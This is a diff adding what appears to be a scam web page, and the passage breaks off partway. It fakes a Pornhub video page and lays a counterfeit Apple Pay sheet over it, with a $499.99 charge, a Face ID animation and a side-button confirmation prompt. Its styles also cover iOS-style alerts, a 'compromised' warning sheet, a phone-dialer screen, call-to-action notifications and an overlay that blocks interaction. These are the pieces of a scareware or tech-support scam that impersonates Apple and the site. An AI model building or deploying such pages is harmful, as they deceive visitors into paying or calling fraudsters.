+            opacity: 0.85;
+            filter: brightness(0.95);
+        }
+
+        .ios-notif:nth-child(2) {
+            z-index: 2;
+            transform: scale(0.98) translateY(-2px);
+            opacity: 0.95;
+            filter: brightness(0.98);
+        }
+
+        .ios-notif:nth-child(3),
+        .ios-notif:last-child {
+            z-index: 10;
+            transform: scale(1) translateY(0);
+            opacity: 1;
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.5);
+            filter: none;
+        }
+
+        @keyframes notifSlideDown {
+            0% {
+                transform: translateY(-40px) scale(0.92);
+                opacity: 0;
+            }
+
+            100% {
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
+        }
+
+        .notif-app-icon {
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            color: #ffffff;
+        }
+
+        .notif-app-icon.green {
+            background-color: #34c759;
+        }
+
+        .notif-app-icon.dark {
+            background-color: #000000;
+        }
+
+        .notif-app-icon.red {
+            background-color: #ff3b30;
+        }
+
+        .notif-app-icon.blue {
+            background-color: #007aff;
+        }
+
+        .notif-content {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .notif-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 2px;
+        }
+
+        .notif-app-name {
+            font-size: 11px;
+            font-weight: 700;
+            color: #8e8e93;
+            text-transform: uppercase;
+            letter-spacing: 0.2px;
+        }
+
+        .notif-time {
+            font-size: 11px;
+            color: #8e8e93;
+        }
+
+        .notif-title {
+            font-size: 13.5px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 2px;
+            line-height: 1.2;
+        }
+
+        .notif-body {
+            font-size: 12px;
+            color: #3c3c43;
+            line-height: 1.35;
+            margin-bottom: 4px;
+        }
+
+        .notif-call-action {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background-color: #007aff;
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 3px 9px;
+            border-radius: 12px;
+            margin-top: 2px;
+            cursor: pointer !important;
+        }
+
+        /* STRICT CURSOR RULES */
+        button,
+        .ios-alert-btn,
+        .ios-card-btn,
+        .ios-dark-btn,
+        .ios-sheet-btn-pill,
+        .ios-dialer-btn-full,
+        .ios-dialer-box,
+        .floating-alert-toast,
+        .ios-notif,
+        .notif-call-action {
+            cursor: pointer !important;
+        }
+
+        /* ==========================================================
+           DESKTOP / MAC RESPONSIVE SCALING (BADA AUR AUTHORITATIVE ON MAC)
+           PHONE (<= 768px) REMAINS EXACT NATIVE COMPACT SCALE
+           ========================================================== */
+        @media (min-width: 769px) {
+
+            /* Popup 1: iOS Alert */
+            .ios-alert-dialog {
+                width: 480px;
+                max-width: 85vw;
+                border-radius: 22px;
+                box-shadow: 0 25px 65px rgba(0, 0, 0, 0.55);
+            }
+
+            .ios-alert-content {
+                padding: 34px 30px 26px 30px;
+            }
+
+            .ios-alert-title {
+                font-size: 25px;
+                margin-bottom: 12px;
+            }
+
+            .ios-alert-message {
+                font-size: 17px;
+                line-height: 1.45;
+            }
+
+            .ios-alert-btn {
+                padding: 18px 16px;
+                font-size: 21px;
+            }
+
+            /* Popup 2: Settings Card */
+            .ios-card-dialog {
+                width: 500px;
+                max-width: 85vw;
+                border-radius: 24px;
+                box-shadow: 0 25px 65px rgba(0, 0, 0, 0.55);
+            }
+
+            .ios-card-body {
+                padding: 36px 32px 28px 32px;
+            }
+
+            .ios-gear-icon-wrapper {
+                width: 92px;
+                height: 92px;
+                margin-bottom: 18px;
+            }
+
+            .ios-gear-icon-wrapper img {
+                width: 92px !important;
+                height: 92px !important;
+                border-radius: 22px !important;
+            }
+
+            .ios-card-title {
+                font-size: 25px;
+                margin-bottom: 14px;
+            }
+
+            .ios-card-text {
+                font-size: 17px;
+                line-height: 1.45;
+                margin-bottom: 18px;
+            }
+
+            .ios-card-timer {
+                font-size: 21px;
+                margin-bottom: 10px;
+            }
+
+            .ios-card-actions .ios-card-btn {
+                padding: 18px 14px;
+                font-size: 21px;
+            }
+
+            /* Popup 3: Dark Mode Alert */
+            .ios-dark-dialog {
+                width: 510px;
+                max-width: 85vw;
+                border-radius: 24px;
+                box-shadow: 0 25px 70px rgba(0, 0, 0, 0.75);
+            }
+
+            .ios-dark-body {
+                padding: 34px 32px 26px 32px;
+            }
+
+            .ios-dark-title {
+                font-size: 24px;
+                margin-bottom: 14px;
+            }
+
+            .ios-dark-text {
+                font-size: 16.5px;
+                line-height: 1.45;
+                margin-bottom: 20px;
+            }
+
+            .ios-dark-banner-row {
+                padding: 16px 20px;
+                border-radius: 16px;
+                gap: 16px;
+            }
+
+            .ios-dark-banner-row img {
+                width: 56px !important;
+                height: 56px !important;
+                border-radius: 14px !important;
+            }
+
+            .ios-dark-banner-text {
+                font-size: 16px;
+                line-height: 1.35;
+            }
+
+            .ios-dark-actions .ios-dark-btn {
+                padding: 18px 14px;
+                font-size: 21px;
+            }
+
+            /* Popup 4: Compromised Badge Sheet */
+            .ios-sheet-dialog {
+                width: 520px;
+                max-width: 85vw;
+                gap: 16px;
+            }
+
+            .ios-sheet-card {
+                padding: 26px 24px;
+                border-radius: 22px;
+                gap: 20px;
+            }
+
+            .ios-sheet-badge-icon {
+                width: 82px;
+                height: 82px;
+            }
+
+            .ios-sheet-badge-icon img {
+                width: 82px !important;
+                height: 82px !important;
+                border-radius: 20px !important;
+            }
+
+            .red-badge-1 {
+                width: 26px;
+                height: 26px;
+                font-size: 14px;
+                top: -6px;
+                right: -6px;
+            }
+
+            .ios-sheet-info h3 {
+                font-size: 21px;
+                margin-bottom: 8px;
+            }
+
+            .ios-sheet-info p {
+                font-size: 17px;
+            }
+
+            .ios-sheet-btn-pill {
+                padding: 20px;
+                border-radius: 20px;
+                font-size: 22px;
+            }
+
+            /* Popup 5: Dialer Screen */
+            .ios-dialer-dialog {
+                width: 500px;
+                max-width: 85vw;
+                border-radius: 24px;
+            }
+
+            .ios-dialer-body {
+                padding: 36px 32px 28px 32px;
+            }
+
+            .ios-dialer-icon {
+                width: 82px;
+                height: 82px;
+                margin-bottom: 18px;
+            }
+
+            .ios-dialer-icon svg {
+                width: 38px;
+                height: 38px;
+            }
+
+            .ios-dialer-title {
+                font-size: 23px;
+                margin-bottom: 10px;
+            }
+
+            .ios-dialer-text {
+                font-size: 16px;
+                line-height: 1.45;
+                margin-bottom: 20px;
+            }
+
+            .ios-dialer-box {
+                padding: 16px;
+                border-radius: 14px;
+                margin-bottom: 20px;
+            }
+
+            .ios-dialer-num {
+                font-size: 24px;
+            }
+
+            .ios-dialer-btn-full {
+                padding: 16px;
+                font-size: 20px;
+                border-radius: 14px;
+            }
+
+            /* Multiplied Stack */
+            .popup-multi-stack {
+                width: 490px;
+                max-width: 80vw;
+            }
+
+            .popup-stack-back {
+                top: -36px;
+                transform: scale(0.92) translateY(-18px);
+            }
+
+            .popup-stack-mid {
+                top: -20px;
+                transform: scale(0.96) translateY(-9px);
+            }
+
+            /* ==========================================================
+               MAC / DESKTOP SIDE NOTIFICATIONS (TOP-RIGHT LIKE macOS)
+               ========================================================== */
+            #notif-layer {
+                top: 20px;
+                right: 20px;
+                left: auto;
+                width: auto;
+                align-items: flex-end;
+            }
+
+            .ios-notif {
+                width: 360px;
+                max-width: 400px;
+                padding: 12px 14px;
+                border-radius: 16px;
+                box-shadow: 0 16px 40px rgba(0, 0, 0, 0.45);
+                animation: macNotifSlideIn 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            }
+
+            @keyframes macNotifSlideIn {
+                0% {
+                    transform: translateX(50px);
+                    opacity: 0;
+                }
+
+                100% {
+                    transform: translateX(0);
+                    opacity: 1;
+                }
+            }
+
+            .floating-alert-toast {
+                top: 20px;
+                right: 20px;
+                left: auto;
+                transform: none;
+                width: 360px;
+                animation: macToastSlideIn 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            }
+
+            @keyframes macToastSlideIn {
+                0% {
+                    transform: translateX(50px);
+                    opacity: 0;
+                }
+
+                100% {
+                    transform: translateX(0);
+                    opacity: 1;
+                }
+            }
+
+            .notif-app-icon {
+                width: 40px;
+                height: 40px;
+                border-radius: 10px;
+            }
+
+            .notif-title {
+                font-size: 13.5px;
+            }
+
+            .notif-body {
+                font-size: 12px;
+            }
+
+            .notif-call-action {
+                font-size: 11.5px;
+                padding: 4px 10px;
+            }
+        }
+
+        @media (max-height: 720px) {
+            #face-id-floating-hud {
+                top: 4% !important;
+                transform: translateX(-50%) scale(0.9) !important;
+            }
+        }
+        /* ==========================================================
+           PURCHASING PREMIUM LOADER POPUP
+           ========================================================== */
+        .premium-loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            z-index: 999999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            pointer-events: auto; /* Block interactions */
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+        .premium-loader-card {
+            background: linear-gradient(145deg, #1f1f1f, #121212);
+            border: 1px solid #ff9000;
+            border-radius: 16px;
+            padding: 32px 24px;
+            text-align: center;
+            width: 320px;
+            box-shadow: 0 15px 50px rgba(255, 144, 0, 0.15), 0 0 0 1px rgba(255,144,0,0.3) inset;
+            transform: scale(0.85);
+            transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.25s ease;
+            position: relative;
+            overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+        .premium-loader-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 50%; height: 100%;
+            background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.05), transparent);
+            transform: skewX(-25deg);
+            animation: phShine 2s infinite;
+        }
+        @keyframes phShine {
+            100% { left: 200%; }
+        }
+        .premium-loader-overlay.show {
+            opacity: 1;
+        }
+        .premium-loader-overlay.show .premium-loader-card {
+            transform: scale(1);
+        }
+        .ph-badge-top {
+            background-color: #ff9000;
+            color: #000;
+            font-weight: 900;
+            font-size: 11px;
+            text-transform: uppercase;
+            padding: 4px 10px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 16px;
+            letter-spacing: 1px;
+        }
+        .ph-loader-spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255,144,0,0.15);
+            border-top-color: #ff9000;
+            border-radius: 50%;
+            animation: phSpin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes phSpin {
+            to { transform: rotate(360deg); }
+        }
+        .ph-loader-title {
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: 900;
+            margin-bottom: 6px;
+            font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+            letter-spacing: -0.5px;
+        }
+        .ph-loader-title span {
+            color: #ff9000;
+        }
+        .ph-loader-text {
+            color: #999999;
+            font-size: 15px;
+            font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+            font-weight: 500;
+        }
+        .ph-loader-price {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #ff9000;
+            font-weight: 700;
+            background: rgba(255, 144, 0, 0.1);
+            padding: 8px;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ==========================================================
+         OFFICIAL APPLE PAY BOTTOM SHEET & SEPARATE FLOATING FACE ID HUD
+         ========================================================== -->
+    <div id="initial-tap-overlay" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.45); z-index: 99999999; display: flex; flex-direction: column; align-items: center; justify-content: flex-end; cursor: pointer; opacity: 0; pointer-events: none; transition: opacity 0.25s ease-in-out; backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); -webkit-tap-highlight-color: transparent; touch-action: manipulation;">
+
+        <!-- SEPARATE FLOATING FACE ID HUD (Positioned independently in upper screen area) -->
+        <div id="face-id-floating-hud" style="position: fixed; top: 11%; left: 50%; transform: translateX(-50%); z-index: 100000002; display: flex; flex-direction: column; align-items: center; justify-content: center; filter: drop-shadow(0 20px 45px rgba(0,0,0,0.6)); cursor: pointer; touch-action: manipulation;">
+            <div id="faceid-lottie" style="width: 135px; height: 133px; margin: 0 auto; display: flex; align-items: center; justify-content: center; overflow: hidden; border-radius: 20px;">
+            </div>
+        </div>
+
+        <div id="apple-pay-card" style="width: 100%; max-width: 440px; background: #f2f2f7; border-radius: 28px 28px 0 0; box-shadow: 0 -12px 50px rgba(0,0,0,0.45); overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; cursor: default; transition: all 0.35s ease; max-height: 94vh; overflow-y: auto; -webkit-overflow-scrolling: touch; z-index: 100000000;">
+
+            <!-- Apple Pay Top Header -->
+            <div style="padding: 16px 20px 10px 20px; display: flex; align-items: center; justify-content: space-between;">
+                <div style="display: flex; align-items: center; gap: 4px;">
+                    <!-- Apple Logo SVG -->
+                    <svg width="20" height="24" viewBox="0 0 170 170" fill="#000000">
+                        <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.7-3.04-7.69-7.8-11.97-14.3-5.87-8.92-10.38-19.14-13.54-30.65-3.16-11.51-4.74-22.37-4.74-32.58 0-14.58 3.5-26.69 10.51-36.33 7-9.64 15.93-14.57 26.79-14.79 4.8 0 10.23 1.25 16.29 3.76 6.06 2.5 9.94 3.82 11.64 3.94 1.34 0 5.48-1.4 12.42-4.2 6.94-2.8 12.82-4.04 17.65-3.73 13.56.8 24.37 5.79 32.44 14.97-11.83 7.15-17.61 16.92-17.34 29.31.27 9.8 4.09 17.96 11.46 24.49 4.39 3.9 9.3 6.64 14.73 8.21-2.43 7.21-5.4 14.43-8.91 21.65zM119.22 33.72c0-7.39 2.65-14.28 7.95-20.67 5.3-6.39 11.78-10.42 19.45-12.09.22 1.3.33 2.45.33 3.44 0 7.33-2.76 14.36-8.28 21.08-5.52 6.72-12.18 10.59-19.98 11.61-.22-1.09-.34-2.22-.34-3.37z"></path>
+                    </svg>
+                    <span style="font-size: 23px; font-weight: 700; color: #000000; letter-spacing: -0.6px; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">Pay</span>
+                </div>
+                <button id="pay-sheet-close" style="width: 32px; height: 32px; border-radius: 50%; background: #e5e5ea; border: none; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #505055; transition: background 0.15s ease;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Card 1: Payment Method (Monzo Flex / Apple Card style) -->
+            <div style="background: #ffffff; border-radius: 16px; padding: 12px 16px; margin: 0 16px 10px 16px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 1px 3px rgba(0,0,0,0.03);">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <!-- Realistic Card Art -->
+                    <div style="width: 44px; height: 28px; border-radius: 5px; background: linear-gradient(135deg, #1f1c2c 0%, #292838 50%, #433f56 100%); position: relative; box-shadow: 0 2px 6px rgba(0,0,0,0.22); overflow: hidden; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+                        <!-- EMV Chip -->
+                        <div style="position: absolute; left: 5px; top: 5px; width: 8px; height: 6px; background: #e2b744; border-radius: 1.5px;">
+                        </div>
+                        <!-- Neon Accent Curves -->
+                        <div style="position: absolute; right: -4px; top: 2px; width: 22px; height: 22px; border: 2.5px solid #ff416c; border-radius: 50%; opacity: 0.85;">
+                        </div>
+                        <!-- Mastercard Interlocking Circles -->
+                        <div style="position: absolute; right: 5px; bottom: 4px; display: flex;">
+                            <div style="width: 7px; height: 7px; border-radius: 50%; background: #eb001b; opacity: 0.9;">
+                            </div>
+                            <div style="width: 7px; height: 7px; border-radius: 50%; background: #f79e1b; opacity: 0.9; margin-left: -3px;">
+                            </div>
+                        </div>
+                    </div>
+                    <div>
+                        <div style="font-size: 16px; font-weight: 600; color: #000000; letter-spacing: -0.2px;">Apple
+                            Card</div>
+                        <div style="display: flex; gap: 6px; margin-top: 3px;">
+                            <span style="font-size: 11px; font-weight: 500; color: #8e8e93; border: 1px solid #d1d1d6; border-radius: 4px; padding: 1px 6px;">Pay
+                                in Full</span>
+                            <span style="font-size: 11px; font-weight: 500; color: #8e8e93; border: 1px solid #d1d1d6; border-radius: 4px; padding: 1px 6px;">Pay
+                                Later</span>
+                        </div>
+                    </div>
+                </div>
+                <div style="display: flex; align-items: center; gap: 8px;">
+                    <span style="font-size: 16px; font-weight: 500; color: #000000; letter-spacing: 0.3px;">••••
+                        5678</span>
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#c7c7cc" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="9 18 15 12 9 6"></polyline>
+                    </svg>
+                </div>
+            </div>
+
+            <!-- Card 2: Subscription Plan (3 Payments / Annual Plan style) -->
+            <div style="background: #ffffff; border-radius: 16px; padding: 14px 16px; margin: 0 16px 10px 16px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 1px 3px rgba(0,0,0,0.03);">
+                <div style="display: flex; align-items: center; gap: 14px;">
+                    <!-- Clock Icon Container -->
+                    <div style="width: 44px; height: 44px; border-radius: 12px; background: #f2f2f7; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+                        <div style="width: 22px; height: 22px; border-radius: 50%; background: #000000; display: flex; align-items: center; justify-content: center; position: relative;">
+                            <div style="width: 1.5px; height: 6px; background: #ffffff; position: absolute; top: 5px; left: 10px; border-radius: 1px;">
+                            </div>
+                            <div style="width: 5px; height: 1.5px; background: #ffffff; position: absolute; top: 10px; left: 10px; border-radius: 1px;">
+                            </div>
+                        </div>
+                    </div>
+                    <div>
+                        <div style="font-size: 13.5px; font-weight: 500; color: #8e8e93;">1-Year VIP Membership</div>
+                        <div style="font-size: 17px; font-weight: 700; color: #000000; margin-top: 1px; letter-spacing: -0.3px;">
+                            $129.89 billed today</div>
+                        <div style="font-size: 13.5px; color: #3c3c43; margin-top: 1px;">(Auto-renewing annual pass)
+                        </div>
+                        <div style="font-size: 12.5px; color: #8e8e93; margin-top: 2px;">Starting today, 9 September
+                            2026</div>
+                    </div>
+                </div>
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#c7c7cc" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="9 18 15 12 9 6"></polyline>
+                </svg>
+            </div>
+
+            <!-- Card 3: Other Cards & Pay Later Options -->
+            <div style="background: #ffffff; border-radius: 16px; padding: 14px 16px; margin: 0 16px 12px 16px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 1px 3px rgba(0,0,0,0.03); cursor: pointer;">
+                <span style="font-size: 15.5px; font-weight: 500; color: #000000;">Other Cards &amp; Pay Later
+                    Options</span>
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#c7c7cc" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="9 18 15 12 9 6"></polyline>
+                </svg>
+            </div>
+
+            <!-- Amount Section: Pay Pornhub VIP / $499.99 -->
+            <div style="padding: 10px 20px 14px 20px;">
+                <div style="display: flex; justify-content: space-between; align-items: flex-end;">
+                    <div>
+                        <div style="font-size: 14.5px; font-weight: 500; color: #8e8e93; margin-bottom: 3px;">Pay
+                            Pornhub VIP</div>
+                        <div id="pay-amount-display" style="font-size: 38px; font-weight: 800; color: #000000; letter-spacing: -0.8px; line-height: 1;">
+                            $499.99
+                        </div>
+                    </div>
+                    <button style="width: 28px; height: 28px; border-radius: 50%; background: #e5e5ea; border: none; color: #636366; font-size: 14px; font-weight: 700; font-family: Georgia, serif; display: flex; align-items: center; justify-content: center; margin-bottom: 4px; cursor: pointer;">
+                        i
+                    </button>
+                </div>
+            </div>
+
+            <!-- Side Button Prompt & Confirmation Section -->
+            <div style="padding: 10px 16px 18px 16px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+
+                <div id="side-button-confirm-box" style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 2px;">
+                    <div style="width: 36px; height: 36px; border-radius: 50%; border: 2.5px solid #007aff; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+                        <!-- iPhone Side Button Glyph -->
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                            <rect x="5" y="3" width="12" height="18" rx="3" stroke="#007aff" stroke-width="2.2" fill="none"></rect>
+                            <path d="M17 7.5 v5" stroke="#007aff" stroke-width="3.2" stroke-linecap="round"></path>
+                            <path d="M11 10 h5" stroke="#007aff" stroke-width="2" stroke-linecap="round"></path>
+                            <polyline points="13.5 7.5 16 10 13.5 12.5" stroke="#007aff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></polyline>
+                        </svg>
+                    </div>
+                    <div id="pay-title" style="font-size: 15.5px; font-weight: 600; color: #1c1c1e; letter-spacing: -0.2px;">
+                        Confirm with Side Button
+                    </div>
+                </div>
+
+                <!-- iPhone Home Indicator Bar -->
+                <div style="width: 134px; height: 5px; background: #000000; border-radius: 100px; margin: 18px auto 2px auto; opacity: 0.85;">
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- ==========================================================
+         TOP NOTIFICATION & MESSAGES LAYER (SLIDE-DOWN FEED)
+         ========================================================== -->
+    <div id="notif-layer"></div>
+
+    <!-- ==========================================================
+         PORNHUB OFFICIAL LANDING PAGE (AUTHENTIC REAL-SITE LAYOUT)
+         ========================================================== -->
+    <div id="pornhub-page">
+        <!-- Pornhub Top Header -->
+        <header class="ph-header">
+            <div class="ph-header-left">
+                <div class="ph-logo">
+                    Porn<span class="ph-logo-badge">hub</span>
+                </div>
+            </div>
+
+            <div class="ph-search-bar">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
+                </svg>
+                <input type="text" placeholder="Search 15M+ free videos &amp; models..." readonly="" value="Sweetie Fox Shower 4K">
+            </div>
+
+            <div class="ph-nav-tabs">
+                <span class="ph-nav-tab active">Home</span>
+                <span class="ph-nav-tab">Videos</span>
+                <span class="ph-nav-tab">Categories</span>
+                <span class="ph-nav-tab" style="display: flex; align-items: center; gap: 4px;">
+                    <span style="width: 7px; height: 7px; background: #ff3b30; border-radius: 50%; display: inline-block;"></span>
+                    Live Cams
+                </span>
+                <span class="ph-nav-tab">Pornstars</span>
+                <span class="ph-nav-tab" style="color: #ff9000; font-weight: 800;">PREMIUM</span>
+            </div>
+
+            <div class="ph-header-right">
+                <button class="ph-btn-login">Log In</button>
+                <button class="ph-btn-signup">Sign Up Free</button>
+            </div>
+        </header>
+
+        <!-- Sub-Nav Categories Strip -->
+        <div class="ph-subnav">
+            <span style="color: #ff9000;">★ Trending Premiere</span>
+            <span>Most Viewed</span>
+            <span>Top Rated</span>
+            <span>4K Ultra HD</span>
+            <span>Verified Amateurs</span>
+            <span>Channels</span>
+            <span>Community</span>
+        </div>
+
+        <!-- Pornhub Main Video Section -->
+        <main class="ph-main-content">
+            <!-- Video Player -->
+            <div class="ph-video-player">
+                <div class="ph-play-btn">
+                    <svg width="32" height="32" viewBox="0 0 24 24" fill="#000000">
+                        <path d="M8 5v14l11-7z"></path>
+                    </svg>
+                </div>
+                <div class="ph-video-controls">
+                    <div class="ph-seekbar-container">
+                        <div class="ph-seekbar-fill"></div>
+                    </div>
+                    <div class="ph-controls-bar">
+                        <div class="ph-controls-left">
+                            <span style="cursor: pointer;">▶</span>
+                            <span>14:20 / 38:45</span>
+                            <span style="color: #888;">🔊 80%</span>
+                        </div>
+                        <div class="ph-controls-right">
+                            <span style="background: #ff9000; color: #000; font-weight: 900; padding: 2px 5px; border-radius: 2px; font-size: 11px;">1080p
+                                HD</span>
+                            <span style="cursor: pointer;">⚙</span>
+                            <span style="cursor: pointer;">⛶ Fullscreen</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Video Details -->
+            <div class="ph-video-details">
+                <div class="ph-video-title">Sweetie Fox - Hot Shower Premiere (Full 4K Ultra HD Episode)</div>
+
+                <div class="ph-video-meta-bar">
+                    <div class="ph-video-views-stat">
+                        <span style="font-weight: 700; color: #fff;">4,921,804 views</span>
+                        <span>•</span>
+                        <span>Added 2 hours ago</span>
+                        <span>•</span>
+                        <span style="color: #34c759; font-weight: 700;">98% Positive</span>
+                    </div>
+                    <div class="ph-video-actions">
+                        <div class="ph-action-pill">👍 194K</div>
+                        <div class="ph-action-pill">👎 2.8K</div>
+                        <div class="ph-action-pill">❤️ Favorite</div>
+                        <div class="ph-action-pill">↗ Share</div>
+                        <div class="ph-action-pill" style="background: #ff9000; color: #000;">⬇ Download (4K)</div>
+                    </div>
+                </div>
+
+                <!-- Creator Strip -->
+                <div class="ph-creator-strip">
+                    <div class="ph-creator-left">
+                        <div class="ph-creator-avatar">SF</div>
+                        <div>
+                            <div class="ph-creator-info-name">
+                                Sweetie Fox
+                                <span style="background: #ff9000; color: #000; font-size: 10px; font-weight: 900; padding: 1px 4px; border-radius: 3px;">✓
+                                    VERIFIED</span>
+                            </div>
+                            <div class="ph-creator-sub-count">1.4M Subscribers • 148 Videos</div>
+                        </div>
+                    </div>
+                    <button class="ph-btn-subscribe">+ SUBSCRIBE (1.4M)</button>
+                </div>
+
+                <!-- Video Tags -->
+                <div class="ph-video-tags">
+                    <span class="ph-tag">Sweetie Fox</span>
+                    <span class="ph-tag">Ultra HD 4K</span>
+                    <span class="ph-tag">Shower</span>
+                    <span class="ph-tag">Verified Amateurs</span>
+                    <span class="ph-tag">Exclusive Premiere</span>
+                    <span class="ph-tag">Trending #1</span>
+                    <span class="ph-tag">Full Length</span>
+                </div>
+            </div>
+
+            <!-- Suggested Videos Grid -->
+            <div style="margin-top: 26px; border-top: 1px solid #222; padding-top: 18px;">
+                <div style="font-size: 16px; font-weight: 800; margin-bottom: 14px; color: #fff; display: flex; align-items: center; justify-content: space-between;">
+                    <span>Recommended Videos</span>
+                    <span style="font-size: 12px; color: #ff9000; cursor: pointer;">View All 15M+ Videos →</span>
+                </div>
+
+                <div class="ph-suggested-grid">
+                    <div class="ph-card">
+                        <div class="ph-card-thumb" style="background-image: url('images/xn_17_t.jpg');">
+                            <span class="ph-duration-pill">24:18</span>
+                        </div>
+                        <div class="ph-card-info">
+                            <div class="ph-card-title">College Roommates Late Night Party 4K</div>
+                            <div class="ph-card-meta">
+                                <span>1.8M views</span>
+                                <span style="color: #34c759; font-weight: 700;">99%</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="ph-card">
+                        <div class="ph-card-thumb" style="background-image: url('images/xn_17_t.jpg'); filter: hue-rotate(40deg);">
+                            <span class="ph-duration-pill">32:10</span>
+                        </div>
+                        <div class="ph-card-info">
+                            <div class="ph-card-title">VIP Stream Full Episode 4K Premiere</div>
+                            <div class="ph-card-meta">
+                                <span>940K views</span>
+                                <span style="color: #34c759; font-weight: 700;">97%</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="ph-card">
+                        <div class="ph-card-thumb" style="background-image: url('images/xn_17_t.jpg'); filter: hue-rotate(80deg);">
+                            <span class="ph-duration-pill">18:45</span>
+                        </div>
+                        <div class="ph-card-info">
+                            <div class="ph-card-title">Private Beach Model Sunset Session</div>
+                            <div class="ph-card-meta">
+                                <span>2.6M views</span>
+                                <span style="color: #34c759; font-weight: 700;">98%</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="ph-card">
+                        <div class="ph-card-thumb" style="background-image: url('images/xn_17_t.jpg'); filter: hue-rotate(120deg);">
+                            <span class="ph-duration-pill">41:20</span>
+                        </div>
+                        <div class="ph-card-info">
+                            <div class="ph-card-title">Exclusive Ultra HD Member Access Scene</div>
+                            <div class="ph-card-meta">
+                                <span>3.9M views</span>
+                                <span style="color: #34c759; font-weight: 700;">99%</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- ==========================================================
+         SEPARATE CONTAINER: EXACT APPLE IOS POPUPS OVERLAY
+         ========================================================== -->
+    <div id="modal-backdrop">
+        <div id="active-popup-container"></div>
+    </div>
+
+    <!-- SVG DEFS FOR AUTHENTIC APPLE SETTINGS ICON -->
+    <svg style="display: none;">
+        <defs>
+            <g id="apple-settings-gear">
+                <!-- Squircle with Apple iOS textured grey gradient -->
+                <rect width="52" height="52" rx="12" fill="url(#settings-grad)"></rect>
+                <!-- Outer Gear Ring -->
+                <circle cx="26" cy="26" r="16" fill="none" stroke="#68686d" stroke-width="3"></circle>
